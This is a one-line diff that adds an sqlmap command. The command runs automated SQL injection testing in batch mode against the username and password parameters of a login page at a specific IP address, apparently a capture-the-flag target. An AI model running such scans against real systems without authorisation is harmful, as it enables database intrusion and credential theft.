@@ -1,0 +1,1 @@
+sqlmap -u "http://35.227.24.107/a0218d304a/login?username=&password=" --method=POST --batch
